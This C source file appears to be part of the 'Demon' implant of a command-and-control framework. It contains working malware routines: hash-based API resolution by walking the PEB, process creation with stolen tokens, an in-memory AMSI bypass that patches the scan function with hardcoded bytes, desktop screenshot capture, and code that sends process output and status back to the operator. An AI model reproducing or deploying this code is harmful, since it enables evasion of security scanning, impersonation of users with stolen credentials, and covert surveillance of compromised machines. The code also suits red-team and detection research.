#include <Core/WinUtils.h>
#include <Core/MiniStd.h>
#include <Core/Package.h>

#include <Common/Clr.h>
#include <Common/Macros.h>
#include <Common/Defines.h>

GUID xCLSID_CLRMetaHost     = {0x9280188d, 0xe8e, 0x4867, {0xb3, 0xc, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde } };
GUID xCLSID_CorRuntimeHost  = { 0xcb2f6723, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } };
GUID xIID_AppDomain         = { 0x05F696DC, 0x2B29, 0x3663, { 0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13 } };
GUID xIID_ICLRMetaHost      = { 0xD332DB9E, 0xB9B3, 0x4125, { 0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16 } };
GUID xIID_ICLRRuntimeInfo   = { 0xBD39D1D2, 0xBA2F, 0x486a, { 0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91 } };
GUID xIID_ICorRuntimeHost   = { 0xcb2f6722, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } };

BOOL W32CreateClrInstance( LPCWSTR dotNetVersion, PICLRMetaHost *ppClrMetaHost, PICLRRuntimeInfo *ppClrRuntimeInfo, ICorRuntimeHost **ppICorRuntimeHost )
{
    BOOL fLoadable = FALSE;

    if ( Instance->Win32.CLRCreateInstance( &xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, ppClrMetaHost ) == S_OK )
    {
        if ( ( *ppClrMetaHost )->lpVtbl->GetRuntime( *ppClrMetaHost, dotNetVersion, &xIID_ICLRRuntimeInfo, (LPVOID*)ppClrRuntimeInfo ) == S_OK )
        {
            if ( ( ( *ppClrRuntimeInfo )->lpVtbl->IsLoadable( *ppClrRuntimeInfo, &fLoadable ) == S_OK ) && fLoadable )
            {
                //Load the CLR into the current process and return a runtime interface pointer. -> CLR changed to ICor which is deprecated but works
                if ( ( *ppClrRuntimeInfo )->lpVtbl->GetInterface( *ppClrRuntimeInfo, &xCLSID_CorRuntimeHost, &xIID_ICorRuntimeHost, ppICorRuntimeHost ) == S_OK )
                {
                    //Start it. This is okay to call even if the CLR is already running
                    ( *ppICorRuntimeHost )->lpVtbl->Start( *ppICorRuntimeHost );
                }
                else
                {
                    PRINTF("[-] ( GetInterface ) Process refusing to get interface of %ls CLR version.  Try running an assembly that requires a different CLR version.\n", dotNetVersion);
                    return 0;
                }
            }
            else
            {
                PRINTF("[-] ( IsLoadable ) Process refusing to load %ls CLR version.  Try running an assembly that requires a different CLR version.\n", dotNetVersion);
                return 0;
            }
        }
        else
        {
            PRINTF("[-] ( GetRuntime ) Process refusing to get runtime of %ls CLR version.  Try running an assembly that requires a different CLR version.\n", dotNetVersion);
            return 0;
        }
    }
    else
    {
        PRINTF("[-] ( CLRCreateInstance ) Process refusing to create %ls CLR version.  Try running an assembly that requires a different CLR version.\n", dotNetVersion);
        return 0;
    }

    return 1;
}

UINT_PTR HashStringEx( LPVOID String, UINT_PTR Length )
{
    ULONG	Hash = 5381;
    PUCHAR	Ptr  = String;

    do
    {
        UCHAR character = *Ptr;

        if ( ! Length )
        {
            if ( !*Ptr ) break;
        }
        else
        {
            if ( (ULONG) ( Ptr - (PUCHAR)String ) >= Length ) break;
            if ( !*Ptr ) ++Ptr;
        }

        if ( character >= 'a' )
            character -= 0x20;

        Hash = ( ( Hash << 5 ) + Hash ) + character;
        ++Ptr;
    } while ( TRUE );

    return Hash;
}

UINT_PTR HashEx( LPVOID String, UINT_PTR Length, BOOL Upper )
{
    ULONG	Hash = 5381;
    PUCHAR	Ptr  = String;

    do
    {
        UCHAR character = *Ptr;

        if ( ! Length )
        {
            if ( !*Ptr ) break;
        }
        else
        {
            if ( (ULONG) ( Ptr - (PUCHAR)String ) >= Length ) break;
            if ( !*Ptr ) ++Ptr;
        }

        if ( Upper )
        {
            if ( character >= 'a' )
                character -= 0x20;
        }


        Hash = ( ( Hash << 5 ) + Hash ) + character;
        ++Ptr;
    } while ( TRUE );

    return Hash;
}

PVOID LdrModulePeb( DWORD hModuleHash )
{
    PLDR_DATA_TABLE_ENTRY   pModule      = ( ( PPEB ) PPEB_PTR )->Ldr->InMemoryOrderModuleList.Flink;
    PLDR_DATA_TABLE_ENTRY   pFirstModule = pModule;
    DWORD                   ModuleHash   = 0;

    do
    {
        ModuleHash = HashStringEx( pModule->FullDllName.Buffer, pModule->FullDllName.Length );

        if ( ModuleHash == hModuleHash )
            return pModule->Reserved2[ 0 ];

        pModule = pModule->Reserved1[ 0 ];

    } while ( pModule && pModule != pFirstModule );

    return INVALID_HANDLE_VALUE;
}

PVOID LdrModuleLoad( LPSTR ModuleName )
{
    if ( ! ModuleName )
        return NULL;

    UNICODE_STRING  UnicodeString           = { 0 };
    WCHAR           ModuleNameW[MAX_PATH]   = { 0 };
    DWORD           dwModuleNameSize        = StringLengthA( ModuleName );
    HMODULE         Module                  = NULL;

    CharStringToWCharString( ModuleNameW, ModuleName, dwModuleNameSize );

    if ( ModuleNameW )
    {
        USHORT DestSize = StringLengthW( ModuleNameW ) * sizeof( WCHAR );
        UnicodeString.Length = DestSize;
        UnicodeString.MaximumLength = DestSize + sizeof( WCHAR );
    }

    UnicodeString.Buffer = ModuleNameW;
    if ( NT_SUCCESS( Instance->Win32.LdrLoadDll( NULL, 0, &UnicodeString, &Module ) ) )
    {
        PRINTF( "%s => [%x]\n", ModuleName, Module );
        return Module;
    }
    else
        return NULL;
}

PVOID LdrFunctionAddr( HMODULE Module, DWORD FunctionHash )
{
    PIMAGE_NT_HEADERS       NtHeader         = NULL;
    PIMAGE_EXPORT_DIRECTORY ExpDirectory     = NULL;
    SIZE_T                  ExpDirectorySize = NULL;
    PDWORD                  AddrOfFunctions  = NULL;
    PDWORD                  AddrOfNames      = NULL;
    PWORD                   AddrOfOrdinals   = NULL;
    PVOID                   FunctionAddr     = NULL;
    PCHAR                   FunctionName     = NULL;
    ANSI_STRING             AnsiString       = { 0 };

    NtHeader         = C_PTR( Module + ( ( PIMAGE_DOS_HEADER ) Module )->e_lfanew );
    ExpDirectory     = C_PTR( Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
    ExpDirectorySize = C_PTR( Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size );

    AddrOfNames      = C_PTR( Module + ExpDirectory->AddressOfNames );
    AddrOfFunctions  = C_PTR( Module + ExpDirectory->AddressOfFunctions );
    AddrOfOrdinals   = C_PTR( Module + ExpDirectory->AddressOfNameOrdinals );

    for ( DWORD i = 0; i < ExpDirectory->NumberOfNames; i++ )
    {
        FunctionName = ( PCHAR ) Module + AddrOfNames[ i ];
        if ( HashStringA( FunctionName ) == FunctionHash )
        {
            FunctionAddr = C_PTR( Module + AddrOfFunctions[ AddrOfOrdinals[ i ] ] );

            // if this is a redirect function then use LdrGetProcedureAddress
            if ( ( ULONG_PTR ) FunctionAddr >= ( ULONG_PTR ) ExpDirectory &&
                 ( ULONG_PTR ) FunctionAddr <  ( ULONG_PTR ) ExpDirectory + ExpDirectorySize )
            {
                AnsiString.Length        = StringLengthA( FunctionName );
                AnsiString.MaximumLength = AnsiString.Length + sizeof( CHAR );
                AnsiString.Buffer        = FunctionName;

                if ( ! NT_SUCCESS( Instance->Win32.LdrGetProcedureAddress( Module, &AnsiString, 0, &FunctionAddr ) ) )
                {
                    return NULL;
                }
            }

            return FunctionAddr;
        }
    }

    PUTS( "API not found" )

    return NULL;
}


PCHAR TokenGetUserDomain( HANDLE hToken, PDWORD UserSize )
{
    LPVOID       TokenUserInfo         = NULL;
    UCHAR        UserName[ MAX_PATH ]  = { 0 };
    UCHAR        Domain[ MAX_PATH ]    = { 0 };
    PUCHAR       UserDomain            = NULL;
    SID_NAME_USE SidType               = 0;
    DWORD        dwLength              = 0;
    DWORD        DomainSize            = MAX_PATH;
    DWORD        UserNameSize          = MAX_PATH;
    UCHAR        Deli[ 2 ]             = { '\\', 0 };

    if ( ! hToken )
        return NULL;

    MemSet( UserName, 0, MAX_PATH );
    MemSet( Domain, 0, MAX_PATH );

    if ( ! Instance->Win32.GetTokenInformation( hToken, TokenUser, TokenUserInfo, 0, &dwLength ) )
    {
        // most likely error: ERROR_INSUFFICIENT_BUFFER
        if ( ( TokenUserInfo = Instance->Win32.LocalAlloc( LPTR, dwLength ) ) )
        {
            if ( ! Instance->Win32.GetTokenInformation( hToken, TokenUser, TokenUserInfo, dwLength, &dwLength ) )
            {
                PRINTF( "[!] Couldn't get Token Information: %d\n", NtGetLastError() )
                return NULL;
            }
        }
    }

    if ( ! Instance->Win32.LookupAccountSidA( NULL, ( ( PTOKEN_USER ) TokenUserInfo )->User.Sid, UserName, &UserNameSize, Domain, &DomainSize, &SidType ) )
    {
        PRINTF( "[%s] LookupAccountSidA failed: %d\n", __FUNCTION__, NtGetLastError() );
        SEND_WIN32_BACK
        return NULL;
    }

    *UserSize  = UserNameSize + 1 + DomainSize;
    UserDomain = Instance->Win32.LocalAlloc( LPTR, *UserSize );

    StringConcatA( UserDomain, Domain );
    StringConcatA( UserDomain, Deli );
    StringConcatA( UserDomain, UserName );

    MemSet( Domain, 0, MAX_PATH );
    MemSet( UserName, 0, MAX_PATH );

    return UserDomain;
}

HANDLE ProcessOpen( DWORD ProcessID, DWORD Access )
{
    HANDLE            hProcess    = NULL;
    CLIENT_ID         ClientID    = { ProcessID, 0 };
    OBJECT_ATTRIBUTES ObjectAttr  = { sizeof( OBJECT_ATTRIBUTES ) };
    NTSTATUS          NtStatus    = STATUS_SUCCESS;

    NtStatus = Instance->Syscall.NtOpenProcess( &hProcess, Access, &ObjectAttr, &ClientID );
    if ( NT_SUCCESS( NtStatus ) )
    {
        return hProcess;
    }

    NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NtStatus ) );

    return NULL;
}

BOOL ProcessIsWow( HANDLE hProcess )
{
    PVOID ProcessWowInfo = NULL;

    if ( ! NT_SUCCESS( Instance->Syscall.NtQueryInformationProcess( hProcess, ProcessWow64Information, &ProcessWowInfo, sizeof( PVOID ), NULL ) ) )
    {
        PUTS( "[!] NtQueryInformationProcess Failed" )
        return FALSE;
    }

    return ProcessWowInfo != 0;
}

BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PROCESS_INFORMATION* ProcessInfo, BOOL Piped, PANONPIPE DataAnonPipes )
{
    PPACKAGE        Package         = NULL;
    ANONPIPE        AnonPipe        = { 0 };
    STARTUPINFOA    StartUpInfo     = { 0 };
    LPWSTR          CommandLineW    = NULL;
    DWORD           CommandLineSize = StringLengthA( CmdLine );
    PVOID           Wow64Value      = NULL;
    BOOL            Return          = TRUE;

    StartUpInfo.cb      = sizeof( STARTUPINFOA );
    StartUpInfo.dwFlags = STARTF_USESTDHANDLES;

    Package = PackageCreate( DEMON_INFO );
    PackageAddInt32( Package, DEMON_INFO_PROC_CREATE );

    if ( Piped )
    {
        PUTS( "Piped enabled" )
        SECURITY_ATTRIBUTES SecurityAttr = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };

        if ( ! Instance->Win32.CreatePipe( &AnonPipe.StdInRead, &AnonPipe.StdInWrite, &SecurityAttr, 0 ) )
        {
            PRINTF( "CreatePipe StdIn Failed: %d\n", NtCurrentProcess() )
            Return = FALSE;
            goto Cleanup;
        }

        if ( ! Instance->Win32.CreatePipe( &AnonPipe.StdOutRead, &AnonPipe.StdOutWrite, &SecurityAttr, 0 ) )
        {
            PRINTF( "CreatePipe StdOut Failed: %d\n", NtCurrentProcess() )
            Return = FALSE;
            goto Cleanup;
        }

        StartUpInfo.hStdError  = AnonPipe.StdOutWrite;
        StartUpInfo.hStdOutput = AnonPipe.StdOutWrite;
        StartUpInfo.hStdInput  = AnonPipe.StdInRead;
    }
    else if ( DataAnonPipes )
    {
        PUTS( "Using specified anon pipes" )
        StartUpInfo.hStdError  = DataAnonPipes->StdOutWrite;
        StartUpInfo.hStdOutput = DataAnonPipes->StdOutWrite;
        StartUpInfo.hStdInput  = DataAnonPipes->StdInRead;
    }

    if ( EnableWow64 )
    {
        if ( ProcessIsWow( NtCurrentProcess() ) )
        {
            PUTS( "Enable Wow64 process support" )
            if ( ! Instance->Win32.Wow64DisableWow64FsRedirection( &Wow64Value ) )
            {
                PRINTF( "Failed to disable wow64 redirection: %d : %x\n", NtGetLastError(), Wow64Value )
                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                Return = FALSE;
                goto Cleanup;
            }
        }
    }

    if ( Instance->Tokens.Impersonate )
    {
        PUTS( "Impersonate" )

        TokenSetPrivilege( SE_IMPERSONATE_NAME, TRUE );
        CommandLineW = Instance->Win32.LocalAlloc( LPTR, CommandLineSize * 2 );
        CharStringToWCharString( CommandLineW, CmdLine, CommandLineSize );

        PRINTF( "CommandLineW[%d]: %ls\n", CommandLineSize, CommandLineW )

        if ( Instance->Tokens.Token->Type == TOKEN_TYPE_STOLEN )
        {
            if ( ! Instance->Win32.CreateProcessWithTokenW( Instance->Tokens.Token->Handle, LOGON_NETCREDENTIALS_ONLY, App, CommandLineW, Flags, NULL, NULL, &StartUpInfo, ProcessInfo ) )
            {
                PRINTF( "CreateProcessWithTokenW: Failed [%d]\n", NtGetLastError() );
                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                Return = FALSE;
                goto Cleanup;
            }
        }
        else if ( Instance->Tokens.Token->Type == TOKEN_TYPE_MAKE_NETWORK )
        {
            if ( ! Instance->Win32.CreateProcessAsUserA(
                        Instance->Tokens.Token->lpUser,
                        Instance->Tokens.Token->lpDomain,
                        Instance->Tokens.Token->lpPassword,
                        LOGON_NETCREDENTIALS_ONLY,
                        App,
                        CommandLineW,
                        Flags,
                        NULL,
                        NULL,
                        &StartUpInfo,
                        ProcessInfo
                    )
                )
            {
                PRINTF( "CreateProcessAsUserA: Failed [%d]\n", NtGetLastError() );
                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                Return = FALSE;
                goto Cleanup;
            }
        }

        MemSet( CommandLineW, 0, CommandLineSize * 2 );
        Instance->Win32.LocalFree( CommandLineW );
    }
    else
    {
        if ( ! Instance->Win32.CreateProcessA( App, CmdLine, NULL, NULL, TRUE, Flags, NULL, NULL, &StartUpInfo, ProcessInfo ) )
        {
            PRINTF( "CreateProcessA: Failed [%d]\n", NtGetLastError() );
            PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
            Return = FALSE;
            goto Cleanup;
        }
    }

    if ( EnableWow64 )
    {
        if ( ProcessIsWow( NtCurrentProcess() ) )
        {
            if ( ! Instance->Win32.Wow64RevertWow64FsRedirection( Wow64Value ) )
            {
                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                Return = FALSE;
                goto Cleanup;
            }
        }
    }

    // Check if we managed to spawn a process
    if ( ProcessInfo->hProcess && Instance->Config.Implant.Verbose )
    {
        PUTS( "Send info back" )
        if ( ! CmdLine )
        {
            PackageAddBytes( Package, App, StringLengthA( App ) );
            PackageAddInt32( Package, ProcessInfo->dwProcessId );
            PackageTransmit( Package, NULL, NULL );
        }
        else
        {
            INT32 i = 0;
            INT32 x = ( INT32 ) StringLengthA( CmdLine );
            PCHAR s = Instance->Win32.LocalAlloc( LPTR, x );

            MemCopy( s, CmdLine, x );

            // remove the arguments. we are just interested in the process name/path
            for ( ; i < x; i++ )
                if ( s[ i ] == ' ' ) break;
            PUTS( s )
            s[ i ] = 0;

            PRINTF( "Process start :: Path:[%s] ProcessId:[%d]\n", s, ProcessInfo->dwProcessId );

            PackageAddBytes( Package, s, StringLengthA( s ) );
            PackageAddInt32( Package, ProcessInfo->dwProcessId );
            PackageTransmit( Package, NULL, NULL );

            PUTS( "Cleanup" )
            MemSet( s, 0, x );
            Instance->Win32.LocalFree( s );
        }
    }

    if ( Piped )
    {
        PUTS( "Piped enabled" )

        Instance->Win32.NtClose( AnonPipe.StdOutWrite );
        Instance->Win32.NtClose( AnonPipe.StdInRead );

        AnonPipesRead( &AnonPipe );

        Instance->Win32.NtClose( AnonPipe.StdOutRead );
        Instance->Win32.NtClose( AnonPipe.StdInWrite );
    }

Cleanup:
    PUTS( "Process cleanup" )
    if ( CommandLineW )
    {
        MemSet( CommandLineW, 0, CommandLineSize * 2 );
        Instance->Win32.LocalFree( CommandLineW );
    }

    PackageDestroy( Package );
    AnonPipesClose( &AnonPipe );

    return Return;
}

/* Patch AMSI */
BOOL BypassPatchAMSI()
{
    HINSTANCE hModuleAmsi   = NULL;
    LPVOID pAddress         = NULL;
    CHAR module[10]         = { 0 };

#ifdef _M_AMD64
    UCHAR amsiPatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; //x64
#elif defined(_M_IX86)
    unsigned char amsiPatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };//x86
#endif

    module[0] = 'a';
    module[1] = 'm';
    module[2] = 's';
    module[3] = 'i';
    module[4] = '.';
    module[5] = 'd';
    module[6] = 'l';
    module[7] = 'l';
    module[8] = 0;

    hModuleAmsi = LdrModuleLoad( module );

    PRINTF( "[+] Loaded asmi.dll: %p\n", hModuleAmsi );

    pAddress = LdrFunctionAddr( hModuleAmsi, 0x29fcd18e );
    if( pAddress == NULL )
        return 0;

    PRINTF("[+] asmi function: %p\n", pAddress);

    LPVOID lpBaseAddress = pAddress;
    ULONG OldProtection, NewProtection;
    SIZE_T uSize = sizeof(amsiPatch);

    PUTS("NtProtectVirtualMemory")
    if ( NT_SUCCESS( Instance->Syscall.NtProtectVirtualMemory( NtCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, PAGE_EXECUTE_READWRITE, &OldProtection ) ) )
    {
        MemCopy( pAddress, amsiPatch, sizeof(amsiPatch) );

        if ( NT_SUCCESS( Instance->Syscall.NtProtectVirtualMemory( NtCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, OldProtection, &NewProtection ) ) )
            return TRUE;

        PUTS( "[-] Failed to change back protection" )

    }

    return FALSE;
}

BOOL AnonPipesInit( PANONPIPE AnonPipes )
{
    SECURITY_ATTRIBUTES SecurityAttr = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };

    if ( ! Instance->Win32.CreatePipe( &AnonPipes->StdInRead, &AnonPipes->StdInWrite, &SecurityAttr, 0 ) )
        goto HandleError;

    if ( ! Instance->Win32.CreatePipe( &AnonPipes->StdOutRead, &AnonPipes->StdOutWrite, &SecurityAttr, 0 ) )
        goto HandleError;

    return TRUE;

HandleError:
    PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );

    return FALSE;
}

VOID AnonPipesRead( PANONPIPE AnonPipes )
{
    PPACKAGE Package         = PackageCreate( DEMON_OUTPUT );
    BOOL     Success         = FALSE;
    LPVOID   Buffer          = NULL;
    UCHAR    buf[ 1025 ]     = { 0 };
    DWORD    dwBufferSize    = 0;
    DWORD    dwRead          = 0;

    PUTS( "Start reading anon pipe" )
    PRINTF( "AnonPipes->StdOutRead => %x\n", AnonPipes->StdOutRead )

    Buffer = Instance->Win32.LocalAlloc( LPTR, 0 );
    do
    {
        Success = Instance->Win32.ReadFile( AnonPipes->StdOutRead, buf, 1024, &dwRead, NULL );
        PRINTF( "dwRead => %d\n", dwRead )

        if ( dwRead == 0 )
            break;

        Buffer = Instance->Win32.LocalReAlloc(
                Buffer,
                dwBufferSize + dwRead,
                LMEM_MOVEABLE | LMEM_ZEROINIT
        );

        dwBufferSize += dwRead;

        MemCopy( Buffer + ( dwBufferSize - dwRead ), buf, dwRead );
        MemSet( buf, 0, dwRead );

    } while ( Success == TRUE );

    PackageAddBytes( Package, Buffer, dwBufferSize );
    PackageTransmit( Package, NULL, NULL );

    MemSet( Buffer, 0, dwBufferSize );
    Instance->Win32.LocalFree( Buffer );
    Buffer = NULL;

    if ( AnonPipes->StdOutRead )
    {
        Instance->Win32.NtClose( AnonPipes->StdOutRead );
        AnonPipes->StdOutRead = NULL;
    }

    if ( AnonPipes->StdInWrite )
    {
        Instance->Win32.NtClose( AnonPipes->StdInWrite );
        AnonPipes->StdInWrite = NULL;
    }
}

VOID AnonPipesClose( PANONPIPE AnonPipes )
{
    if ( AnonPipes->StdOutRead )
    {
        Instance->Win32.NtClose( AnonPipes->StdOutRead );
        AnonPipes->StdOutRead = NULL;
    }

    if ( AnonPipes->StdInWrite )
    {
        Instance->Win32.NtClose( AnonPipes->StdInWrite );
        AnonPipes->StdInWrite = NULL;
    }

    if ( AnonPipes->StdInRead )
    {
        Instance->Win32.NtClose( AnonPipes->StdInRead );
        AnonPipes->StdInRead = NULL;
    }

    if ( AnonPipes->StdInWrite )
    {
        Instance->Win32.NtClose( AnonPipes->StdInWrite );
        AnonPipes->StdInWrite = NULL;
    }
}

PNT_TIB W32GetTibFromThread( HANDLE hThread )
{
    THREAD_BASIC_INFORMATION ThreadBasicInfo = { 0 };
    PNT_TIB                  ThreadIB        = NULL;
    NTSTATUS                 NtStatus        = STATUS_SUCCESS;

    ThreadIB = Instance->Win32.LocalAlloc( LPTR, sizeof( NT_TIB ) );
    MemSet( ThreadIB, 0, sizeof( NT_TIB ) );

    NtStatus = Instance->Syscall.NtQueryInformationThread( hThread, ThreadBasicInformation, &ThreadBasicInfo, sizeof( ThreadBasicInfo ), NULL );
    if ( NT_SUCCESS( NtStatus ) )
    {
        Instance->Syscall.NtReadVirtualMemory( NtCurrentProcess(), ThreadBasicInfo.TebBaseAddress, ThreadIB, sizeof( NT_TIB ), NULL );
        return ThreadIB;
    }
}

HANDLE W32GetRandomThread()
{
    HANDLE  hThread     = NULL;
    ULONG   BufferSize  = 0;
    PVOID   Buffer      = NULL;
    NTSTATUS NtStatus   = NULL;

    OBJECT_ATTRIBUTES             ObjAttr  = { sizeof( OBJECT_ATTRIBUTES ) };
    D_PSYSTEM_PROCESS_INFORMATION SysInfo  = { 0 };

    NtStatus = Instance->Syscall.NtQuerySystemInformation( SystemProcessInformation, Buffer, BufferSize, &BufferSize );
    if ( NtStatus == STATUS_INFO_LENGTH_MISMATCH )
    {
        Buffer = Instance->Win32.LocalAlloc( LPTR, BufferSize );

        if ( ! NT_SUCCESS( ( NtStatus = Instance->Syscall.NtQuerySystemInformation( SystemProcessInformation, Buffer, BufferSize, &BufferSize ) ) ) )
        {
            PRINTF( "Error %d calling NtQuerySystemInformation.\n", Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
            return NULL;
        }

        unsigned int i = 0;

        do {
            SysInfo = &Buffer[ i ];

            if ( SysInfo->ProcessId == Instance->Session.PID )
            {
                for ( UINT32 j = 0; j < SysInfo->ThreadCount; j++)
                {
                    if ( Instance->ThreadEnvBlock->ClientId.UniqueThread == SysInfo->ThreadInfos[ j ].ClientId.UniqueThread )
                    {
                        PRINTF( "Thread %d:\t%d ", j, SysInfo->ThreadInfos[ j ].ClientId.UniqueThread );
                        if ( NT_SUCCESS( ( NtStatus = Instance->Syscall.NtOpenThread( &hThread, THREAD_ALL_ACCESS, &ObjAttr, &SysInfo->ThreadInfos[ j ].ClientId ) ) ) )
                            return hThread;
                        else
                            PRINTF( "NtOpenThread: Failed: [%d]\n", Instance->Win32.RtlNtStatusToDosError( NtStatus ) )

                        NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
                        SEND_WIN32_BACK
                    }
                }
            }

            i += SysInfo->NextOffset;

        } while ( SysInfo->NextOffset != 0 );

        // free memory
        Instance->Win32.LocalFree( Buffer );
    }
}

BOOL W32TakeScreenShot( PVOID* ImagePointer, PSIZE_T ImageSize )
{
    BITMAPFILEHEADER    BitFileHdr  = { 0 };
    BITMAPINFOHEADER    BitInfoHdr  = { 0 };
    BITMAPINFO          BitMapInfo  = { 0 };
    HGDIOBJ             hTempMap    = NULL;
    HBITMAP             hBitmap     = NULL;
    BITMAP              AllDesktops = { 0 };
    HDC                 hDC, hMemDC = NULL;
    BYTE*               bBits       = NULL;
    DWORD               cbBits      = 0;

    PVOID               BitMapImage = NULL;
    PVOID               BitMapSize  = NULL;

    INT x = Instance->Win32.GetSystemMetrics( SM_XVIRTUALSCREEN );
    INT y = Instance->Win32.GetSystemMetrics( SM_YVIRTUALSCREEN );

    MemSet( &BitFileHdr, 0, sizeof( BITMAPFILEHEADER ) );
    MemSet( &BitInfoHdr, 0, sizeof( BITMAPINFOHEADER ) );
    MemSet( &BitMapInfo, 0, sizeof( BITMAPINFO ) );
    MemSet( &AllDesktops,0, sizeof( BITMAP ) );

    hDC      = Instance->Win32.GetDC( NULL );
    hTempMap = Instance->Win32.GetCurrentObject( hDC, OBJ_BITMAP );

    Instance->Win32.GetObjectW( hTempMap, sizeof( BITMAP ), &AllDesktops );

    BitFileHdr.bfType        = ( WORD ) ( 'B' | ( 'M' << 8 ) );
    BitFileHdr.bfOffBits     = sizeof( BITMAPFILEHEADER ) + sizeof( BITMAPINFOHEADER );
    BitInfoHdr.biSize        = sizeof( BITMAPINFOHEADER );
    BitInfoHdr.biBitCount    = 24;
    BitInfoHdr.biCompression = BI_RGB;
    BitInfoHdr.biPlanes      = 1;
    BitInfoHdr.biWidth       = AllDesktops.bmWidth;
    BitInfoHdr.biHeight      = AllDesktops.bmHeight;

    BitMapInfo.bmiHeader     = BitInfoHdr;

    cbBits     = ( ( ( 24 * AllDesktops.bmWidth + 31 ) &~31 ) / 8 ) * AllDesktops.bmHeight;

    BitMapSize  = cbBits + ( sizeof( BITMAPFILEHEADER ) + sizeof( BITMAPINFOHEADER ) );
    BitMapImage = Instance->Win32.LocalAlloc( LPTR, BitMapSize );

    hMemDC  = Instance->Win32.CreateCompatibleDC( hDC );
    hBitmap = Instance->Win32.CreateDIBSection( hDC, &BitMapInfo, DIB_RGB_COLORS, ( VOID** ) &bBits, NULL, 0 );

    Instance->Win32.SelectObject( hMemDC, hBitmap );
    Instance->Win32.BitBlt( hMemDC, 0, 0, AllDesktops.bmWidth, AllDesktops.bmHeight, hDC, x, y, SRCCOPY );

    MemCopy( BitMapImage, &BitFileHdr, sizeof( BITMAPFILEHEADER ) );
    MemCopy( BitMapImage + sizeof( BITMAPFILEHEADER ), &BitInfoHdr, sizeof( BITMAPINFOHEADER ) );
    MemCopy( BitMapImage + sizeof( BITMAPFILEHEADER ) + sizeof( BITMAPINFOHEADER ), bBits, cbBits );

    if ( ImagePointer )
        *ImagePointer = BitMapImage;

    if ( ImageSize )
        *ImageSize = BitMapSize;

    CLEANUP:
    if ( hTempMap )
        Instance->Win32.DeleteObject( hTempMap );

    if ( hMemDC )
        Instance->Win32.DeleteDC( hMemDC );

    if ( hDC )
        Instance->Win32.ReleaseDC( NULL, hDC );

    if ( hBitmap )
        Instance->Win32.DeleteObject( hBitmap );

    return TRUE;
}

ULONG RandomNumber32( VOID )
{
    ULONG Seed = 0;

    Seed = Instance->Win32.GetTickCount();
    Seed = Instance->Win32.RtlRandomEx( &Seed );
    Seed = Instance->Win32.RtlRandomEx( &Seed );
    Seed = ( Seed % ( LONG_MAX - 2 + 1 ) ) + 2;

    return Seed % 2 == 0 ? Seed : Seed + 1;
}
